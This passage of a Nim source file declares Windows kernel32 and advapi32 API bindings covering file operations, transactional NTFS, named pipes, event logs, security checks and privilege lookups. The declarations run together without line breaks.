GetSystemWow64DirectoryW*(lpBuffer: LPWSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64EnableWow64FsRedirection*(Wow64FsEnableRedirection: BOOLEAN): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetDllDirectoryA*(lpPathName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetDllDirectoryW*(lpPathName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDllDirectoryA*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDllDirectoryW*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetSearchPathMode*(Flags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateDirectoryExA*(lpTemplateDirectory: LPCSTR, lpNewDirectory: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateDirectoryExW*(lpTemplateDirectory: LPCWSTR, lpNewDirectory: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateDirectoryTransactedA*(lpTemplateDirectory: LPCSTR, lpNewDirectory: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateDirectoryTransactedW*(lpTemplateDirectory: LPCWSTR, lpNewDirectory: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveDirectoryTransactedA*(lpPathName: LPCSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveDirectoryTransactedW*(lpPathName: LPCWSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFullPathNameTransactedA*(lpFileName: LPCSTR, nBufferLength: DWORD, lpBuffer: LPSTR, lpFilePart: ptr LPSTR, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFullPathNameTransactedW*(lpFileName: LPCWSTR, nBufferLength: DWORD, lpBuffer: LPWSTR, lpFilePart: ptr LPWSTR, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc DefineDosDeviceA*(dwFlags: DWORD, lpDeviceName: LPCSTR, lpTargetPath: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryDosDeviceA*(lpDeviceName: LPCSTR, lpTargetPath: LPSTR, ucchMax: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileTransactedA*(lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE, hTransaction: HANDLE, pusMiniVersion: PUSHORT, lpExtendedParameter: PVOID): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileTransactedW*(lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE, hTransaction: HANDLE, pusMiniVersion: PUSHORT, lpExtendedParameter: PVOID): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReOpenFile*(hOriginalFile: HANDLE, dwDesiredAccess: DWORD, dwShareMode: DWORD, dwFlagsAndAttributes: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileAttributesTransactedA*(lpFileName: LPCSTR, dwFileAttributes: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileAttributesTransactedW*(lpFileName: LPCWSTR, dwFileAttributes: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileAttributesTransactedA*(lpFileName: LPCSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileAttributesTransactedW*(lpFileName: LPCWSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCompressedFileSizeA*(lpFileName: LPCSTR, lpFileSizeHigh: LPDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCompressedFileSizeW*(lpFileName: LPCWSTR, lpFileSizeHigh: LPDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCompressedFileSizeTransactedA*(lpFileName: LPCSTR, lpFileSizeHigh: LPDWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCompressedFileSizeTransactedW*(lpFileName: LPCWSTR, lpFileSizeHigh: LPDWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteFileTransactedA*(lpFileName: LPCSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteFileTransactedW*(lpFileName: LPCWSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CheckNameLegalDOS8Dot3A*(lpName: LPCSTR, lpOemName: LPSTR, OemNameSize: DWORD, pbNameContainsSpaces: PBOOL, pbNameLegal: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CheckNameLegalDOS8Dot3W*(lpName: LPCWSTR, lpOemName: LPSTR, OemNameSize: DWORD, pbNameContainsSpaces: PBOOL, pbNameLegal: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFileA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, bFailIfExists: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFileW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, bFailIfExists: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFileExA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFileExW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileTransactedA*(lpFileName: LPCSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD, hTransaction: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileTransactedW*(lpFileName: LPCWSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD, hTransaction: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFileTransactedA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFileTransactedW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CopyFile2*(pwszExistingFileName: PCWSTR, pwszNewFileName: PCWSTR, pExtendedParameters: ptr COPYFILE2_EXTENDED_PARAMETERS): HRESULT {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileExA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileExW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileWithProgressA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileWithProgressW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileTransactedA*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MoveFileTransactedW*(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReplaceFileA*(lpReplacedFileName: LPCSTR, lpReplacementFileName: LPCSTR, lpBackupFileName: LPCSTR, dwReplaceFlags: DWORD, lpExclude: LPVOID, lpReserved: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReplaceFileW*(lpReplacedFileName: LPCWSTR, lpReplacementFileName: LPCWSTR, lpBackupFileName: LPCWSTR, dwReplaceFlags: DWORD, lpExclude: LPVOID, lpReserved: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateHardLinkA*(lpFileName: LPCSTR, lpExistingFileName: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateHardLinkW*(lpFileName: LPCWSTR, lpExistingFileName: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateHardLinkTransactedA*(lpFileName: LPCSTR, lpExistingFileName: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateHardLinkTransactedW*(lpFileName: LPCWSTR, lpExistingFileName: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstStreamW*(lpFileName: LPCWSTR, InfoLevel: STREAM_INFO_LEVELS, lpFindStreamData: LPVOID, dwFlags: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextStreamW*(hFindStream: HANDLE, lpFindStreamData: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstStreamTransactedW*(lpFileName: LPCWSTR, InfoLevel: STREAM_INFO_LEVELS, lpFindStreamData: LPVOID, dwFlags: DWORD, hTransaction: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileNameW*(lpFileName: LPCWSTR, dwFlags: DWORD, StringLength: LPDWORD, LinkName: PWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextFileNameW*(hFindStream: HANDLE, StringLength: LPDWORD, LinkName: PWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileNameTransactedW*(lpFileName: LPCWSTR, dwFlags: DWORD, StringLength: LPDWORD, LinkName: PWSTR, hTransaction: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeClientComputerNameA*(Pipe: HANDLE, ClientComputerName: LPSTR, ClientComputerNameLength: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeClientProcessId*(Pipe: HANDLE, ClientProcessId: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeClientSessionId*(Pipe: HANDLE, ClientSessionId: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeServerProcessId*(Pipe: HANDLE, ServerProcessId: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeServerSessionId*(Pipe: HANDLE, ServerSessionId: PULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileBandwidthReservation*(hFile: HANDLE, nPeriodMilliseconds: DWORD, nBytesPerPeriod: DWORD, bDiscardable: WINBOOL, lpTransferSize: LPDWORD, lpNumOutstandingRequests: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileBandwidthReservation*(hFile: HANDLE, lpPeriodMilliseconds: LPDWORD, lpBytesPerPeriod: LPDWORD, pDiscardable: LPBOOL, lpTransferSize: LPDWORD, lpNumOutstandingRequests: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateNamedPipeA*(lpName: LPCSTR, dwOpenMode: DWORD, dwPipeMode: DWORD, nMaxInstances: DWORD, nOutBufferSize: DWORD, nInBufferSize: DWORD, nDefaultTimeOut: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeHandleStateA*(hNamedPipe: HANDLE, lpState: LPDWORD, lpCurInstances: LPDWORD, lpMaxCollectionCount: LPDWORD, lpCollectDataTimeout: LPDWORD, lpUserName: LPSTR, nMaxUserNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeHandleStateW*(hNamedPipe: HANDLE, lpState: LPDWORD, lpCurInstances: LPDWORD, lpMaxCollectionCount: LPDWORD, lpCollectDataTimeout: LPDWORD, lpUserName: LPWSTR, nMaxUserNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CallNamedPipeA*(lpNamedPipeName: LPCSTR, lpInBuffer: LPVOID, nInBufferSize: DWORD, lpOutBuffer: LPVOID, nOutBufferSize: DWORD, lpBytesRead: LPDWORD, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CallNamedPipeW*(lpNamedPipeName: LPCWSTR, lpInBuffer: LPVOID, nInBufferSize: DWORD, lpOutBuffer: LPVOID, nOutBufferSize: DWORD, lpBytesRead: LPDWORD, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitNamedPipeA*(lpNamedPipeName: LPCSTR, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetVolumeLabelA*(lpRootPathName: LPCSTR, lpVolumeName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetVolumeLabelW*(lpRootPathName: LPCWSTR, lpVolumeName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileApisToOEM*(): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileApisToANSI*(): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc AreFileApisANSI*(): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumeInformationA*(lpRootPathName: LPCSTR, lpVolumeNameBuffer: LPSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPSTR, nFileSystemNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ClearEventLogA*(hEventLog: HANDLE, lpBackupFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ClearEventLogW*(hEventLog: HANDLE, lpBackupFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc BackupEventLogA*(hEventLog: HANDLE, lpBackupFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc BackupEventLogW*(hEventLog: HANDLE, lpBackupFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc CloseEventLog*(hEventLog: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DeregisterEventSource*(hEventLog: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc NotifyChangeEventLog*(hEventLog: HANDLE, hEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetNumberOfEventLogRecords*(hEventLog: HANDLE, NumberOfRecords: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetOldestEventLogRecord*(hEventLog: HANDLE, OldestRecord: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenEventLogA*(lpUNCServerName: LPCSTR, lpSourceName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenEventLogW*(lpUNCServerName: LPCWSTR, lpSourceName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc.}proc RegisterEventSourceA*(lpUNCServerName: LPCSTR, lpSourceName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc.}proc RegisterEventSourceW*(lpUNCServerName: LPCWSTR, lpSourceName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenBackupEventLogA*(lpUNCServerName: LPCSTR, lpFileName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenBackupEventLogW*(lpUNCServerName: LPCWSTR, lpFileName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc.}proc ReadEventLogA*(hEventLog: HANDLE, dwReadFlags: DWORD, dwRecordOffset: DWORD, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, pnBytesRead: ptr DWORD, pnMinNumberOfBytesNeeded: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ReadEventLogW*(hEventLog: HANDLE, dwReadFlags: DWORD, dwRecordOffset: DWORD, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, pnBytesRead: ptr DWORD, pnMinNumberOfBytesNeeded: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ReportEventA*(hEventLog: HANDLE, wType: WORD, wCategory: WORD, dwEventID: DWORD, lpUserSid: PSID, wNumStrings: WORD, dwDataSize: DWORD, lpStrings: ptr LPCSTR, lpRawData: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ReportEventW*(hEventLog: HANDLE, wType: WORD, wCategory: WORD, dwEventID: DWORD, lpUserSid: PSID, wNumStrings: WORD, dwDataSize: DWORD, lpStrings: ptr LPCWSTR, lpRawData: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetNamedPipeClientComputerName*(Pipe: HANDLE, ClientComputerName: LPSTR, ClientComputerNameLength: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetNamedPipeClientComputerNameA".}proc GetEventLogInformation*(hEventLog: HANDLE, dwInfoLevel: DWORD, lpBuffer: LPVOID, cbBufSize: DWORD, pcbBytesNeeded: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc OperationStart*(OperationStartParams: ptr OPERATION_START_PARAMETERS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc OperationEnd*(OperationEndParams: ptr OPERATION_END_PARAMETERS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckAndAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPSTR, ObjectName: LPSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, DesiredAccess: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeAndAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPCSTR, ObjectName: LPCSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeResultListAndAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPCSTR, ObjectName: LPCSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc AccessCheckByTypeResultListAndAuditAlarmByHandleA*(SubsystemName: LPCSTR, HandleId: LPVOID, ClientToken: HANDLE, ObjectTypeName: LPCSTR, ObjectName: LPCSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectOpenAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPSTR, ObjectName: LPSTR, pSecurityDescriptor: PSECURITY_DESCRIPTOR, ClientToken: HANDLE, DesiredAccess: DWORD, GrantedAccess: DWORD, Privileges: PPRIVILEGE_SET, ObjectCreation: WINBOOL, AccessGranted: WINBOOL, GenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectPrivilegeAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, ClientToken: HANDLE, DesiredAccess: DWORD, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectCloseAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ObjectDeleteAuditAlarmA*(SubsystemName: LPCSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc PrivilegedServiceAuditAlarmA*(SubsystemName: LPCSTR, ServiceName: LPCSTR, ClientToken: HANDLE, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc SetFileSecurityA*(lpFileName: LPCSTR, SecurityInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc GetFileSecurityA*(lpFileName: LPCSTR, RequestedInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR, nLength: DWORD, lpnLengthNeeded: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc ReadDirectoryChangesW*(hDirectory: HANDLE, lpBuffer: LPVOID, nBufferLength: DWORD, bWatchSubtree: WINBOOL, dwNotifyFilter: DWORD, lpBytesReturned: LPDWORD, lpOverlapped: LPOVERLAPPED, lpCompletionRoutine: LPOVERLAPPED_COMPLETION_ROUTINE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadReadPtr*(lp: pointer, ucb: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadWritePtr*(lp: LPVOID, ucb: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadHugeReadPtr*(lp: pointer, ucb: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadHugeWritePtr*(lp: LPVOID, ucb: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadCodePtr*(lpfn: FARPROC): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadStringPtrA*(lpsz: LPCSTR, ucchMax: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsBadStringPtrW*(lpsz: LPCWSTR, ucchMax: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MapViewOfFileExNuma*(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T, lpBaseAddress: LPVOID, nndPreferred: DWORD): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddConditionalAce*(pAcl: PACL, dwAceRevision: DWORD, AceFlags: DWORD, AceType: UCHAR, AccessMask: DWORD, pSid: PSID, ConditionStr: PWCHAR, ReturnLength: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupAccountSidA*(lpSystemName: LPCSTR, Sid: PSID, Name: LPSTR, cchName: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupAccountSidW*(lpSystemName: LPCWSTR, Sid: PSID, Name: LPWSTR, cchName: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupAccountNameA*(lpSystemName: LPCSTR, lpAccountName: LPCSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupAccountNameW*(lpSystemName: LPCWSTR, lpAccountName: LPCWSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPWSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupPrivilegeValueA*(lpSystemName: LPCSTR, lpName: LPCSTR, lpLuid: PLUID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupPrivilegeValueW*(lpSystemName: LPCWSTR, lpName: LPCWSTR, lpLuid: PLUID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupPrivilegeNameA*(lpSystemName: LPCSTR, lpLuid: PLUID, lpName: LPSTR, cchName: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupPrivilegeNameW*(lpSystemName: LPCWSTR, lpLuid: PLUID, lpName: LPWSTR, cchName: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupPrivilegeDisplayNameA*(lpSystemName: LPCSTR, lpName: LPCSTR, lpDisplayName: LPSTR, cchDisplayName: LPDWORD, lpLanguageId: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc LookupPrivilegeDisplayNameW*(lpSystemName: LPCWSTR, lpName: LPCWSTR, lpDisplayName: LPWSTR, cchDisplayName: LPDWORD, lpLanguageId: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc BuildCommDCBA*(lpDef: LPCSTR, lpDCB: LPDCB): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BuildCommDCBW*(lpDef: LPCWSTR, lpDCB: LPDCB): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BuildCommDCBAndTimeoutsA*(lpDef: LPCSTR, lpDCB: LPDCB, lpCommTimeouts: LPCOMMTIMEOUTS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BuildCommDCBAndTimeoutsW*(lpDef: 